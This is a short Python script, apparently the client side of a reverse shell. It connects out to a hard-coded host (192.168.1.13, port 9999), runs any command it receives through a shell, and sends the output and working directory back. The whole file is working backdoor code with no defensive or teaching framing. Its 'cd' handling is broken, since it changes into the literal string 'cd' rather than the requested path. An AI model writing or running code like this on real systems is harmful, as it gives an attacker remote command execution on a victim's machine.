import socket
import os
import subprocess

s = socket.socket()
host = '192.168.1.13'
port = 9999

s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[:2].decode("utf-8"))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output, "utf-8")
        cDir = os.getcwd() + ">"
        s.send(str.encode(output_str + cDir))
        print(output_str)
